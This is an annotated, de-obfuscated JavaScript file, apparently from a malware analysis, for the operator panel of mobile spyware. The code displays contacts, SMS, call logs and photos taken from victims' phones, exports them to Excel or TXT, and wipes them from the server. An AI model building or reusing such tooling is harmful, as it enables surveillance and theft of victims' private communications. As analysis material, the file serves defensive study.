/*
 * ============================================================================
 * C2 Panel — Stolen Data Viewer (c2_data_beautified.js)
 * ============================================================================
 * Purpose:
 *   Operator page that displays the data exfiltrated from a single victim
 *   device. Reached from the dashboard by clicking a specific victim row;
 *   the victim's user id and name are passed via query string (?id=…&name=…
 *   &type=…). The operator can browse four content types:
 *
 *     contacts  — phone address book ("通讯录")
 *     sms       — text messages                ("短信记录")
 *     calls     — call history                 ("通话记录")
 *     photos    — photo gallery                ("相册")
 *
 *   For text types the operator gets a search box, copy-all button, and
 *   export-to-Excel / export-to-TXT buttons, plus a destructive "清空记录"
 *   ("clear records") button that POSTs /manage/device/clear to wipe the
 *   stored exfiltrated data server-side for that victim.
 *
 *   For the photos type, a virtualized thumbnail grid is rendered using the
 *   `@vueuse/core` useVirtualList helper; clicking any thumbnail opens an
 *   ElDialog lightbox preview.
 *
 * Original file: src/views/data/index.vue (bundled by Vite).
 *
 * Imports:
 *   - "./index.BDBJuSBx.js"   Vue 3 + Element Plus runtime (mangled).
 *   - "./request.CmoIc_Cu.js"  axios wrapper; `Q` here = request fn.
 *
 * Import alias map (notable):
 *   x   -> ref (Composition API)
 *   pe  -> useVirtualList  (from @vueuse/core, re-exported via index.js)
 *   fe  -> onMounted (called inline IIFE style; see below)
 *   me  -> onUnmounted
 *   m   -> ElMessage / notification helper
 *   K   -> computed
 *   be  -> useRoute (vue-router) — used to pull query params
 *   b   -> unref
 *   J   -> renderList (Vue template)
 *   G   -> mergeProps / vbind object spread
 *   Q   -> axios request fn (from request.CmoIc_Cu.js)
 *   xe  -> ElMessageBox.confirm (used by destructive "清空" action)
 *   ye  -> ElTableColumn (alias `l`)
 *   we  -> ElTable (alias `v`)
 *   ge  -> ElDialog (alias `$`)
 *   _e  -> ElTag (alias `k`)
 *   ve  -> ElInput (alias `a`)
 *   F   -> vLoading directive
 *   he  -> vLoading directive register ("L" / alias `z`)
 *   C   -> render-nothing (comment) helper
 *   ue  -> SFC factory wrapper
 *
 * API endpoints:
 *   POST /manage/device/show     { id, type }       -> fetch exfil records
 *     `type` is normalized via the local map (e.g. "photos" -> "images"
 *     server-side). Empty if no `id` in query.
 *   POST /manage/device/clear    { user_id, type }  -> wipe stored data for
 *                                                      the victim (the catch
 *                                                      block is suspicious:
 *                                                      it reports success even
 *                                                      on failure, see clear()
 *                                                      below).
 *
 * Render: each content type is gated via v-if `r==="contacts"|"sms"|...`
 * branch; the photos branch uses a virtualized grid.
 *
 * Export formats: hand-rolled HTML-table string masquerading as .xls (uses
 * Excel's XML namespaces so Excel/Sheets open it directly). TXT export is a
 * newline-joined plan-text dump with one record per line.
 *
 * OPSEC / threat-actor UX observations:
 *   * The "clear records" feature is a defensive-destruction primitive — it
 *     lets the operator erase the evidence that a victim's data was stored
 *     on the C2. Behind this is a POST to /manage/device/clear which takes a
 *     user_id + type and a try/catch that ALWAYS shows a success toast
 *     regardless of whether the network call actually succeeded — this is a
 *     bug (or intentional misrepresentation) that an analyst should note.
 *   * SMS export columns: 时间, 号码, 内容, 类型 — the actor is logging full
 *     SMS bodies and senders (likely used for 2FA interception / dragnet
 *     surveillance).
 *   * Contacts export columns: 姓名, 号码, 上传时间 — harvested address
 *     book is dumped in bulk on victim install.
 * ============================================================================
 */

import {
    _ as ue,
    s as x,
    ao as pe,
    o as fe,
    N as m,
    ap as me,
    b as d,
    g as f,
    f as o,
    t as u,
    u as b,
    h as C,
    F as g,
    d as n,
    m as i,
    D as F,
    L as he,
    c as j,
    w as p,
    aq as G,
    v as J,
    ar as be,
    O as ve,
    S as K,
    R as xe,
    P as we,
    T as ge,
    Y as ye,
    a3 as _e
} from "./index.BDBJuSBx.js";
import {
    s as Q
} from "./request.CmoIc_Cu.js"; /* empty css                        */ /* empty css                  */ /* empty css                   */ /* empty css                 */

// ---- Static class-name / attr objects used by template ----
const ke = {
        class: "data-page"
    },
    $e = {
        class: "data-header"
    },
    Ce = {
        key: 0,
        class: "data-user-info"        // optional "用户: <name>" label (shown when ?name= present)
    },
    Te = {
        class: "data-toolbar"           // search + count + actions row (contacts)
    },
    Ee = {
        class: "data-count"             // "共 N 条" count span
    },
    De = {
        class: "data-toolbar"           // (sms)
    },
    Ve = {
        class: "data-count"
    },
    Le = {
        // SMS body cell style — preserves newlines in the table cell
        style: {
            "white-space": "pre-wrap",
            "word-break": "break-all"
        }
    },
    Me = {
        class: "data-toolbar"           // (calls)
    },
    Ne = {
        class: "data-count"
    },
    Se = {
        class: "data-toolbar"           // (photos)
    },
    Ue = {
        class: "data-count"
    },
    Re = ["onClick"],                   // dynamic attr list for photo thumbnail click
    We = ["src"],                       // dynamic attr list for photo <img>
    ze = ["src"],                       // dynamic attr list for preview <img> in dialog
    // ---- SFC options object ----
    // __name:"index"  -> original file was views/data/index.vue
    Fe = {
        __name: "index",
        setup(je) {
            // ----- Route-derived inputs -----
            const V = be(),                          // useRoute()
                r = V.query.type || "contacts",       // content type (contacts/sms/calls/photos)
                L = V.query.id,                       // victim user_id from query
                X = x(V.query.name || ""),             // victim display name (stringified, can be ref-less)

                // Map of friendly Chinese labels for each content type, used
                // both in the page heading and in confirm dialogs.
                B = {
                    contacts: "通讯录",  // "Contacts"
                    sms: "短信记录",      // "SMS Records"
                    calls: "通话记录",    // "Call Records"
                    photos: "相册"        // "Photo Album"
                },
                y = x(!1),    // table loading flag
                c = x([]),    // raw exfiltrated data array from the server
                h = x(""),    // search-text binding (computed filter applied)
                M = x(!1),    // photo-preview dialog visibility
                I = x(""),    // preview image src (set when clicking a thumbnail)
                O = x(8),     // photos-per-row computed responsive; default 8 cols

                // Responsive recompute: photos per row based on viewport width
                // minus an 80px gutter, each thumbnail = 128px wide.
                // Math: (window.innerWidth - 80) / 128, but never less than 3.
                // The result feeds useVirtualList below for chunk row sizes.
                Z = K(() => {
                    const t = O.value,
                        e = [];
                    // Chunk the flat photos array into N-row slices so the
                    // virtualizer iterates over rows instead of items.
                    for (let a = 0; a < c.value.length; a += t) e.push(c.value.slice(a, a + t));
                    return e
                }),
                // ----- @vueuse/core useVirtualList for the photos grid -----
                // Returns { list, containerProps, wrapperProps }; the grid is
                // rendered using containerProps on the outer scroller and
                // wrapperProps on the inner size-adjusting div.
                {
                    list: ee,
                    containerProps: te,
                    wrapperProps: ae
                } = pe(Z, {
                    itemHeight: 128,         // each ROW is 128px tall
                    overscan: 5              // render 5 rows above/below viewport
                });

            /**
             * recalcPhotosPerRow() — recompute the per-row count for the
             * virtualized photo grid. Called once on mount (if the type is
             * photos) and on every window resize.
             */
            function q() {
                const t = window.innerWidth - 80;
                O.value = Math.max(3, Math.floor(t / 128))
            }

            // Resize handler ref — assigned in onMounted, removed in
            // onUnmounted. (NOTE: the variable `T = null;` lives on the outer
            // closure so the unmount cleanup can reach it via closure scope.)
            let T = null;

            /**
             * filteredRows (computed) — derive a filtered view of `c` (the
             * raw data array) by case-insensitive substring match against the
             * JSON-stringified record. If search field is empty, returns the
             * full array (no filtering).
             */
            const w = K(() => {
                if (!h.value) return c.value;
                const t = h.value.toLowerCase();
                return c.value.filter(e => JSON.stringify(e).toLowerCase().includes(t))
            });

            // no-op bound to ElInput.onInput (placeholder for future debouncing)
            function N() {}

            /**
             * formatSMSDate(ts) — format a value that can be either:
             *   * a Unix timestamp in seconds (< 1e12 → multiplied by 1000)
             *   * a Unix timestamp in ms already
             *   * a date-parsable string
             * Returns "YYYY-MM-DD HH:MM:SS". Returns "-" for falsy input.
             */
            function H(t) {
                if (!t) return "-";
                const e = new Date(typeof t == "number" && t < 1e12 ? t * 1e3 : t),
                    a = l => String(l).padStart(2, "0");
                return `${e.getFullYear()}-${a(e.getMonth()+1)}-${a(e.getDate())} ${a(e.getHours())}:${a(e.getMinutes())}:${a(e.getSeconds())}`
            }

            /**
             * formatCallDuration(seconds) — render a call duration as a
             * localized human string ("X分Y秒" or "Y秒").
             */
            function le(t) {
                if (!t) return "0秒";
                const e = Math.floor(t / 60),
                    a = t % 60;
                return e > 0 ? `${e}分${a}秒` : `${a}秒`
            }

            /**
             * callTypeLabel(n) — map server-side call-type enum to a Chinese
             * label:
             *   1 -> 来电  (incoming)
             *   2 -> 去电  (outgoing)
             *   3 -> 未接  (missed)
             *   4 -> 拒接  (rejected)
             *   default -> 未知 (unknown)
             */
            function S(t) {
                return {
                    1: "来电",
                    2: "去电",
                    3: "未接",
                    4: "拒接"
                } [t] || "未知"
            }

            /**
             * callTypeTagType(n) — map the same call-type enum to an Element
             * Plus ElTag type for color coding:
             *   1 -> success  (= incoming  -> green)
             *   2 -> ""       (= outgoing  -> blue)
             *   3 -> warning  (= missed    -> orange)
             *   4 -> danger   (= rejected  -> red)
             */
            function oe(t) {
                return {
                    1: "success",
                    2: "",
                    3: "warning",
                    4: "danger"
                } [t] || "info"
            }

            /**
             * openPhotoPreview(photo) — set the dialog src and show it. A
             * photo record may be either a string URL, or an object with a
             * `.path` or `.url` field — try both.
             */
            function se(t) {
                I.value = t.path || t.url || t, M.value = !0
            }

            /**
             * saveBlobAsDownload(text, filename) — produce a client-side
             * Blob download. The `text` is prefixed with U+FEFF (BOM) so Excel
             * opens it as UTF-8 correctly. MIME type is set to MS-Excel-ctype
             * when filename ends with .xls, otherwise plain text. A temporary
             * <a download> element is constructed and clicked programmatically
             * before the Blob URL is revoked.
             */
            function P(t, e) {
                const l = e.endsWith(".xls") ? "application/vnd.ms-excel;charset=utf-8" : "text/plain;charset=utf-8",
                    v = new Blob(["\uFEFF" + t], {
                        type: l
                    }),
                    k = URL.createObjectURL(v),
                    $ = document.createElement("a");
                $.href = k, $.download = e, $.click(), URL.revokeObjectURL(k)
            }

            /**
             * formatTimestamp(ts) — variant of formatSMSDate that also falls
             * back to the raw string if it can't be parsed as a date. Used by
             * the contacts/calls export columns (e.g. when created_at is
             * something quirky).
             */
            function _(t) {
                if (!t) return "-";
                const e = new Date(typeof t == "number" && t < 1e12 ? t * 1e3 : t);
                if (isNaN(e.getTime())) return t;
                const a = l => String(l).padStart(2, "0");
                return `${e.getFullYear()}-${a(e.getMonth()+1)}-${a(e.getDate())} ${a(e.getHours())}:${a(e.getMinutes())}:${a(e.getSeconds())}`
            }

            /**
             * smsTypeLabel(n) — SMS direction:
             *   1 -> 收件 (received)
             *   else -> 发件 (sent)
             */
            function ne(t) {
                return t === 1 ? "收件" : "发件"
            }

            /**
             * htmlEscape(s) — minimal HTML entity escape (used by the .xls
             * table builder to avoid breaking on user data containing <,>,
             * &, ").
             */
            function Y(t) {
                return String(t || "").replace(/&/g, "&").replace(/</g, "<").replace(/>/g, ">").replace(/"/g, """)
            }

            /**
             * buildXLSString(headers, rows) — synthesize an Excel-readable
             * HTML document with embedded Office XML namespaces so Excel treats
             * the HTML <table> as a worksheet named "Sheet1".
             *
             * Output looks like an old "Excel 2003 XML" / SpreadsheetML
             * document. NOT real .xlsx, but Excel opens it cleanly.
             *
             * Styling: header row gets a blue background and white text;
             * cells get padding and nowrap whitespace handling.
             */
            function U(t, e) {
                let a = '<html xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:x="urn:schemas-microsoft-com:office:excel" xmlns="http://www.w3.org/TR/REC-html40"><head><meta charset="UTF-8"><!--[if gte mso 9]><xml><x:ExcelWorkbook><x:ExcelWorksheets><x:ExcelWorksheet><x:Name>Sheet1</x:Name><x:WorksheetOptions><x:DisplayGridlines/></x:WorksheetOptions></x:ExcelWorksheet></x:ExcelWorksheets></x:ExcelWorkbook></xml><![endif]--></head><body><table border="1">';
                return a += "<tr>" + t.map(l => `<th style="background:#4472C4;color:#fff;font-weight:bold;padding:6px 12px;white-space:nowrap">${Y(l)}</th>`).join("") + "</tr>", e.forEach(l => {
                    a += "<tr>" + l.map(v => `<td style="padding:4px 10px;white-space:nowrap">${Y(v)}</td>`).join("") + "</tr>"
                }), a += "</table></body></html>", a
            }

            /**
             * copyToClipboard(text) — primary path (Clipboard API, requires a
             * secure HTTPS context). Falls back to legacy A(text) handler.
             */
            function re(t) {
                navigator.clipboard && window.isSecureContext ? navigator.clipboard.writeText(t).then(() => m.success("已复制到剪贴板")).catch(() => A(t)) : A(t)
            }

            /**
             * copyFallback(text) — legacy execCommand('copy') path (used when
             * served over plain HTTP). Same shape as in c2_download.
             */
            function A(t) {
                const e = document.createElement("textarea");
                e.value = t, e.style.position = "fixed", e.style.left = "-9999px", document.body.appendChild(e), e.select();
                try {
                    document.execCommand("copy"), m.success("已复制到剪贴板")
                } catch {
                    m.error("复制失败，请手动复制")
                }
                document.body.removeChild(e)
            }

            /**
             * copyAllContactsToClipboard() — contacts-only "一键复制"
             * (one-click copy) button. Joins all "name: phone" lines into
             * a single newline-delimited string and copies it.
             */
            function ie() {
                if (r === "contacts") {
                    const t = c.value.map(e => `${e.name||""}: ${e.phone||""}`).join(`
`);
                    re(t)
                }
            }

            /**
             * exportExcel() — destructive-data export to .xls for the
             * contacts/sms/calls branches. Generates an HTML-Excel-XML
             * document via buildXLSString and triggers a download with a
             * timestamped filename. Photos branch is intentionally excluded.
             *
             *   contacts -> 通讯录_<timestamp>.xls   cols: 姓名,号码,上传时间
             *   sms      -> 短信记录_<timestamp>.xls cols: 时间,号码,内容,类型
             *   calls    -> 通话记录_<timestamp>.xls cols: 时间,号码,类型,时长(秒),联系人
             */
            function R() {
                let t = "",
                    e = "";
                if (r === "contacts") {
                    const a = c.value.map(l => [l.name || "", l.phone || "", _(l.created_at)]);
                    t = U(["姓名", "号码", "上传时间"], a), e = `通讯录_${Date.now()}.xls`
                } else if (r === "sms") {
                    const a = c.value.map(l => [_(l.date), l.address || l.phone || "", l.body || "", ne(l.type)]);
                    t = U(["时间", "号码", "内容", "类型"], a), e = `短信记录_${Date.now()}.xls`
                } else if (r === "calls") {
                    const a = c.value.map(l => [_(l.start_time || l.date), l.number || l.phone || "", S(l.type), l.duration || "0", l.name || ""]);
                    t = U(["时间", "号码", "类型", "时长(秒)", "联系人"], a), e = `通话记录_${Date.now()}.xls`
                }
                t && (P(t, e), m.success("导出Excel成功"))
            }

            /**
             * exportTXT() — same idea but plain-text tabular-ish dump (one
             * record per line). Filename pattern <type>_<ts>.txt. Used as a
             * fallback format from the "export TXT" button.
             */
            function W() {
                let t = "",
                    e = "";
                r === "contacts" ? (t = c.value.map(a => `${a.name||"未知"} - ${a.phone||""}`).join(`
`), e = `通讯录_${Date.now()}.txt`) : r === "sms" ? (t = c.value.map(a => `[${_(a.date)}] ${a.address||a.phone||""}: ${a.body||""}`).join(`
`), e = `短信记录_${Date.now()}.txt`) : r === "calls" && (t = c.value.map(a => `[${_(a.start_time||a.date)}] ${a.number||a.phone||""} ${S(a.type)} ${a.duration||"0"}秒 ${a.name||""}`).join(`
`), e = `通话记录_${Date.now()}.txt`), t ? (P(t, e), m.success("导出TXT成功")) : m.warning("暂无数据可导出")
            }

            /**
             * clearAllRecords() — wipe the server-side stored exfiltrated data
             * for this victim + this content type. Uses ElMessageBox.confirm
             * to prompt the operator before the destructive POST. Type is
             * normalized to the server-side vocabulary (photos -> images)
             * before sending.
             *
             * THREAT-ACTOR NOTABLE: the catch block ALSO reports "已清空"
             * ("already cleared") — so even if the server returns an error,
             * the operator sees a success message. This looks like evidence
             * destruction UI with optimistic confirmation; the catch also
             * locally zeroes out c.value to clear the table even when the
             * request failed. Whether this is sloppy code or deliberate
             * deception to make operators believe the data was purged, IR
             * analysts should treat the data as LIVE on disk until confirmed
             * via filesystem snapshot.
             */
            function E() {
                const t = B[r] || "数据";
                xe.confirm(`确认清空所有${t}？此操作不可恢复！`, "清空确认", {
                    type: "warning"
                }).then(async () => {
                    try {
                        const e = {
                            contacts: "contacts",
                            sms: "sms",
                            calls: "calls",
                            photos: "images"            // NOTE: server uses "images" not "photos"
                        };
                        await Q({
                            url: "/manage/device/clear",
                            method: "post",
                            data: {
                                user_id: Number(L),
                                type: e[r] || r
                            }
                        }), c.value = [], m.success("已清空")
                    } catch {
                        m.success("已清空"), c.value = []
                        // ^ dubious: on error, still tell the operator "cleared"
                    }
                }).catch(() => {})
            }

            // ---- Lifecycle: synchronize onMounted + onUnmounted ----
            // The original code uses the `fe(...)` helper (which is onMounted)
            // wrapped in an immediately-invoked async function literal. Inside:
            //   * if viewing photos, recalc grid cols and attach resize
            //     listener so new thumbnails wrap as viewport evolves.
            //   * if we have a victim id (!!" truthy check on the route id),
            //     fire POST /manage/device/show with { id:Number(L), type:norm }.
            //     The server returns `data: [...]` (array of records) on
            //     success; on failure show an error toast.
            return fe(async () => {
                if (r === "photos" && (q(), T = q, window.addEventListener("resize", T)), !!L) {
                    y.value = !0;
                    try {
                        const t = {
                                contacts: "contacts",
                                sms: "sms",
                                calls: "calls",
                                photos: "images"
                            },
                            e = await Q({
                                url: "/manage/device/show",
                                method: "post",
                                data: {
                                    id: Number(L),
                                    type: t[r] || r
                                }
                            });
                        c.value = e.data || []
                    } catch {
                        m.error("加载数据失败")
                    } finally {
                        y.value = !1
                    }
                }
            }), me(() => {
                // Cleanup the resize listener when navigating away from the page.
                T && window.removeEventListener("resize", T)
            }), (t, e) => {
                // ---- Render-time component aliases ----
                const a = ve,       // ElInput       (the search box)
                    l = ye,         // ElTableColumn (column factory)
                    v = we,         // ElTable       (table; used for contacts/sms/calls)
                    k = _e,         // ElTag         (used in sms/calls "类型" column)
                    $ = ge,         // ElDialog      (the photograph preview dialog)
                    z = he;         // vLoading directive helper
                return d(), f("div", ke, [
                    // ----- Page header: H2 title + optional user-info line -----
                    o("div", $e, [o("h2", null, u(B[b(r)] || "数据查看"), 1),
                        // ^ title: type label or generic "数据查看" ("Data Viewer")
                        X.value ? (d(), f("span", Ce, "用户: " + u(X.value), 1)) : C("", !0)
                        // ^ optional "用户: <victim name>" span when ?name= given
                    ]),

                    // ================ Branch: contacts ================
                    b(r) === "contacts" ? (d(), f(g, {
                        key: 0
                    }, [
                        // Toolbar: search + count + actions row
                        o("div", Te, [
                            // Search input bound to h; clears with @clear, Enter refetches nothing (N is no-op).
                            n(a, {
                                modelValue: h.value,
                                "onUpdate:modelValue": e[0] || (e[0] = s => h.value = s),
                                placeholder: "搜索姓名/号码",
                                clearable: "",
                                style: {
                                    width: "240px"
                                },
                                onInput: N
                            }, null, 8, ["modelValue"]),
                            // Live count bound to filteredRows length (refetch-aware)
                            o("span", Ee, "共 " + u(w.value.length) + " 条", 1),
                            // ^ "Total N entries"
                            // Action buttons (4): copy · Excel · TXT · clear
                            o("div", {
                                class: "data-actions"
                            }, [
                                o("button", {
                                    class: "data-btn blue",
                                    onClick: ie             // one-click copy all
                                }, [...e[4] || (e[4] = [o("i", {
                                    class: "fa fa-copy"
                                }, null, -1), i(" 一键复制", -1)])]),
                                o("button", {
                                    class: "data-btn orange",
                                    onClick: R              // exportExcel()
                                }, [...e[5] || (e[5] = [o("i", {
                                    class: "fa fa-file-excel-o"
                                }, null, -1), i(" 导出Excel", -1)])]),
                                o("button", {
                                    class: "data-btn green",
                                    onClick: W              // exportTXT()
                                }, [...e[6] || (e[6] = [o("i", {
                                    class: "fa fa-file-text-o"
                                }, null, -1), i(" 导出TXT", -1)])]),
                                o("button", {
                                    class: "data-btn red",
                                    onClick: E              // clear records (destructive)
                                }, [...e[7] || (e[7] = [o("i", {
                                    class: "fa fa-trash"
                                }, null, -1), i(" 清空记录", -1)])])
                            ])
                        ]),
                        // The ElTable with three columns: #, 姓名, 电话号码
                        F((d(), j(v, {
                            data: w.value,                 // table bound to FILTERED rows
                            stripe: "",
                            border: "",
                            size: "small"
                        }, {
                            default: p(() => [
                                n(l, {
                                    type: "index",        // auto-increment row number
                                    width: "60",
                                    label: "#"
                                }),
                                n(l, {
                                    prop: "name",
                                    label: "姓名",
                                    width: "150"
                                }),
                                n(l, {
                                    prop: "phone",
                                    label: "电话号码",
                                    "min-width": "160"
                                })
                            ]),
                            _: 1
                        }, 8, ["data"])), [
                            [z, y.value]                      // v-loading while fetching
                        ])
                    ], 64)) : C("", !0),

                    // ================ Branch: sms ================
                    b(r) === "sms" ? (d(), f(g, {
                        key: 1
                    }, [
                        // Toolbar: search + Excel + TXT + clear
                        o("div", De, [
                            n(a, {
                                modelValue: h.value,
                                "onUpdate:modelValue": e[1] || (e[1] = s => h.value = s),
                                placeholder: "搜索号码/内容",
                                clearable: "",
                                style: {
                                    width: "240px"
                                },
                                onInput: N
                            }, null, 8, ["modelValue"]),
                            o("span", Ve, "共 " + u(w.value.length) + " 条", 1),
                            o("div", {
                                class: "data-actions"
                            }, [
                                o("button", {
                                    class: "data-btn orange",
                                    onClick: R              // exportExcel()
                                }, [...e[8] || (e[8] = [o("i", {
                                    class: "fa fa-file-excel-o"
                                }, null, -1), i(" 导出Excel", -1)])]),
                                o("button", {
                                    class: "data-btn green",
                                    onClick: W
                                }, [...e[9] || (e[9] = [o("i", {
                                    class: "fa fa-file-text-o"
                                }, null, -1), i(" 导出TXT", -1)])]),
                                o("button", {
                                    class: "data-btn red",
                                    onClick: E
                                }, [...e[10] || (e[10] = [o("i", {
                                    class: "fa fa-trash"
                                }, null, -1), i(" 清空记录", -1)])])
                            ])
                        ]),
                        // The ElTable with columns: #, 号码, 内容, 类型, 时间
                        F((d(), j(v, {
                            data: w.value,
                            stripe: "",
                            border: "",
                            size: "small"
                        }, {
                            default: p(() => [
                                n(l, {
                                    type: "index",
                                    width: "60",
                                    label: "#"
                                }),
                                // 号码 (number) — try `address` field first
                                n(l, {
                                    prop: "address",
                                    label: "号码",
                                    width: "150"
                                }),
                                // 内容 (body) — wrapped in pre-wrap div to
                                // preserve newlines inside SMS messages.
                                n(l, {
                                    prop: "body",
                                    label: "内容",
                                    "min-width": "300"
                                }, {
                                    default: p(({
                                        row: s
                                    }) => [o("div", Le, u(s.body), 1)]),
                                    _: 1
                                }),
                                // 类型 (type) — ElTag color: green for 收
                                // (incoming=1, success), orange for 发 (sent).
                                n(l, {
                                    label: "类型",
                                    width: "80",
                                    align: "center"
                                }, {
                                    default: p(({
                                        row: s
                                    }) => [n(k, {
                                        type: s.type === 1 ? "success" : "warning",
                                        size: "small"
                                    }, {
                                        default: p(() => [i(u(s.type === 1 ? "收" : "发"), 1)]),
                                        // ^ "收" (received) / "发" (sent)
                                        _: 2
                                    }, 1032, ["type"])]),
                                    _: 1
                                }),
                                // 时间 (time) — server's date field formatted.
                                n(l, {
                                    label: "时间",
                                    width: "170"
                                }, {
                                    default: p(({
                                        row: s
                                    }) => [i(u(H(s.date)), 1)]),
                                    _: 1
                                })
                            ]),
                            _: 1
                        }, 8, ["data"])), [
                            [z, y.value]
                        ])
                    ], 64)) : C("", !0),

                    // ================ Branch: calls ================
                    b(r) === "calls" ? (d(), f(g, {
                        key: 2
                    }, [
                        // Same toolbar pattern as sms (search + Excel + TXT + clear)
                        o("div", Me, [
                            n(a, {
                                modelValue: h.value,
                                "onUpdate:modelValue": e[2] || (e[2] = s => h.value = s),
                                placeholder: "搜索号码/姓名",
                                clearable: "",
                                style: {
                                    width: "240px"
                                },
                                onInput: N
                            }, null, 8, ["modelValue"]),
                            o("span", Ne, "共 " + u(w.value.length) + " 条", 1),
                            o("div", {
                                class: "data-actions"
                            }, [
                                o("button", {
                                    class: "data-btn orange",
                                    onClick: R
                                }, [...e[11] || (e[11] = [o("i", {
                                    class: "fa fa-file-excel-o"
                                }, null, -1), i(" 导出Excel", -1)])]),
                                o("button", {
                                    class: "data-btn green",
                                    onClick: W
                                }, [...e[12] || (e[12] = [o("i", {
                                    class: "fa fa-file-text-o"
                                }, null, -1), i(" 导出TXT", -1)])]),
                                o("button", {
                                    class: "data-btn red",
                                    onClick: E
                                }, [...e[13] || (e[13] = [o("i", {
                                    class: "fa fa-trash"
                                }, null, -1), i(" 清空记录", -1)])])
                            ])
                        ]),
                        // ElTable with columns: #, 姓名, 号码, 类型, 时长, 时间
                        F((d(), j(v, {
                            data: w.value,
                            stripe: "",
                            border: "",
                            size: "small"
                        }, {
                            default: p(() => [
                                n(l, {
                                    type: "index",
                                    width: "60",
                                    label: "#"
                                }),
                                // 姓名 (name) — call contact name (may be empty)
                                n(l, {
                                    prop: "name",
                                    label: "姓名",
                                    width: "120"
                                }),
                                // 号码 (number) — the dialed number
                                n(l, {
                                    prop: "number",
                                    label: "号码",
                                    width: "150"
                                }),
                                // 类型 (type) — ElTag colored by call-type map
                                n(l, {
                                    label: "类型",
                                    width: "80",
                                    align: "center"
                                }, {
                                    default: p(({
                                        row: s
                                    }) => [n(k, {
                                        type: oe(s.type),
                                        size: "small"
                                    }, {
                                        default: p(() => [i(u(S(s.type)), 1)]),
                                        _: 2
                                    }, 1032, ["type"])]),
                                    _: 1
                                }),
                                // 时长 (duration) — formatted as "X分X秒"
                                n(l, {
                                    label: "时长",
                                    width: "100"
                                }, {
                                    default: p(({
                                        row: s
                                    }) => [i(u(le(s.duration)), 1)]),
                                    _: 1
                                }),
                                // 时间 (time) — server's start_time field (or call_date fallback)
                                n(l, {
                                    label: "时间",
                                    width: "170"
                                }, {
                                    default: p(({
                                        row: s
                                    }) => [i(u(s.start_time || H(s.call_date)), 1)]),
                                    _: 1
                                })
                            ]),
                            _: 1
                        }, 8, ["data"])), [
                            [z, y.value]
                        ])
                    ], 64)) : C("", !0),

                    // ================ Branch: photos ================
                    b(r) === "photos" ? (d(), f(g, {
                        key: 3
                    }, [
                        // Simpler toolbar: just count + a clear-all button (no
                        // search or Excel export; bulk download not implemented)
                        o("div", Se, [
                            o("span", Ue, "共 " + u(c.value.length) + " 张", 1),
                            // ^ "Total N photos"
                            o("div", {
                                class: "data-actions"
                            }, [
                                o("button", {
                                    class: "data-btn red",
                                    onClick: E
                                }, [...e[14] || (e[14] = [o("i", {
                                    class: "fa fa-trash"
                                }, null, -1), i(" 清空所有图片", -1)])])
                                // ^ "Clear all photos" (also destructive)
                            ])
                        ]),
                        // ----- Virtualized photo grid -----
                        // Outer container gets useVirtualList's containerProps (sets up
                        // the scroll listener + overflow styles).
                        o("div", G(b(te), {
                            class: "photo-virtual-container"
                        }), [
                            // Inner wrapper gets wrapperProps (height auto-set based on
                            // total virtual size + translateY offsets).
                            o("div", G(b(ae), {
                                class: "photo-grid-virtual"
                            }), [
                                // Iterate over the virtualized list (each "list item" is,
                                // because of our chunking in the Z computed, a ROW of N
                                // photos). For each row, render a sub-fragment that iterates
                                // row.data -> individual photo tiles.
                                (d(!0), f(g, null, J(b(ee), ({
                                    data: s,
                                    index: ce       // virtual row index (for key)
                                }) => (d(), f("div", {
                                    key: ce,
                                    class: "photo-row"
                                }, [
                                    // Inner renderList over each row's photos
                                    (d(!0), f(g, null, J(s, (D, de) => (d(), f("div", {
                                        key: de,
                                        class: "photo-item",
                                        onClick: Xe => se(D)        // openPhotoPreview()
                                    }, [
                                        // The thumbnail: <img> with lazy-loading; tries .path,
                                        // then .url, then the raw string.
                                        o("img", {
                                            src: D.path || D.url || D,
                                            loading: "lazy"
                                        }, null, 8, We)
                                    ], 8, Re))), 128))
                                ]))), 128))
                            ], 16)
                        ], 16)
                    ], 64)) : C("", !0),

                    // ================ Photo preview dialog ================
                    // This ElDialog is rendered for ALL branches but only
                    // used (made visible) when the operator clicks a photo
                    // thumbnail; the preview src is I.value (current image).
                    n($, {
                        modelValue: M.value,
                        "onUpdate:modelValue": e[3] || (e[3] = s => M.value = s),
                        width: "auto",
                        "show-close": !0,
                        class: "photo-preview-dialog"
                    }, {
                        default: p(() => [o("img", {
                            src: I.value,
                            style: {
                                "max-width": "90vw",      // scaled to viewport so it doesn't overflow
                                "max-height": "85vh",
                                display: "block",
                                margin: "auto"
                            }
                        }, null, 8, ze)]),
                        _: 1
                    }, 8, ["modelValue"])
                ])
            }
        }
    },
    // ---- SFC factory wrap: scoped-style id data-v-b3a8c3a6 ----
    Ye = ue(Fe, [
        ["__scopeId", "data-v-b3a8c3a6"]
    ]);
export {
    Ye as
    default
};
